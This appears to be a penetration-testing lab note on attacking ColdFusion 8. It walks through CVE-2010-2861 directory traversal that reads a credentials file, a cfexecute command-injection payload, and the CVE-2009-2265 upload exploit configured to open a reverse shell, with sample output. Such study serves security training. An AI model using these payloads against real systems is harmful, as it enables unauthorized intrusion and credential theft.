## Attacking ColdFusion
#### 1. Searchsploit Recon for ColdFusion

Use `searchsploit` to enumerate known exploits:

```bash
searchsploit adobe coldfusion
```

Key relevant entries for ColdFusion 8:

- Directory Traversal: `/usr/share/exploitdb/exploits/multiple/remote/14641.py`    
- Unauthenticated RCE: `/usr/share/exploitdb/exploits/cfm/webapps/50057.py`
#### 2. ColdFusion Directory Traversal Exploit (CVE-2010-2861)

Summary:  
This vulnerability allows path traversal by manipulating ColdFusion `.cfm` endpoint parameters like `locale`.

Vulnerable Endpoints:

- `CFIDE/administrator/settings/mappings.cfm`    
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

PoC URL:

```http
http://target/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

Exploit Usage:

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py <host> <port> <filepath>
```

Example:

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

Output Snippet:

```
rdspassword=0IA/F[[E>[$_6&
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

`password.properties` contains encrypted credentials for internal services (DB, LDAP, Mail).
#### 3. Understanding Unauthenticated RCE

Definition:  
Allows code execution without any form of authentication. Often stems from exposed uploaders, misconfigured cfexecute calls, or deserialization bugs.

Example vulnerable CFML snippet:

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

Exploitation (Decoded):

```http
http://example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
```

Encoded Payload:

```
http://example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```
#### 4. ColdFusion 8 Unauthenticated RCE via File Upload (CVE-2009-2265)

Vulnerability Path:

```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

Exploit Used:

```
/usr/share/exploitdb/exploits/cfm/webapps/50057.py
```

Setup:

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Modify Script Variables:

```python
lhost = '10.10.14.55'
lport = 4444
rhost = '10.129.247.30'
rport = 8500
```
#### 5. Exploit Execution and Reverse Shell

```bash
python3 50057.py
```

Exploit Behavior:

- Generates and uploads malicious `.jsp` payload    
- Triggers remote execution via the vulnerable upload handler
- Deletes payload after execution

Sample Response:

```
Uploading payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp
Listening on 10.10.14.55:4444
Received connection from 10.129.247.30:49866
```
#### 6. Shell Access

```bash
Ncat: Connection from 10.129.247.30:49866
```

Post-exploitation context:

```cmd
C:\ColdFusion8\runtime\bin> dir
...
jrun.exe
jrunsvc.exe
wsdl2java.exe
sniffer.exe
...
```

Reverse shell as ColdFusion service user confirms successful code execution on target.

Conclusion:

- ColdFusion 8 is vulnerable to both authenticated and unauthenticated remote code execution.
- CVE-2010-2861 allows reading sensitive config files, including encrypted service credentials.
- CVE-2009-2265 enables unauthenticated RCE by uploading and executing a JSP payload via FCKeditor.
- Both vulnerabilities provide significant attack surface for lateral movement or privilege escalation.
# Tags
> #Exploitation #Application-Exploitation #ColdFusion 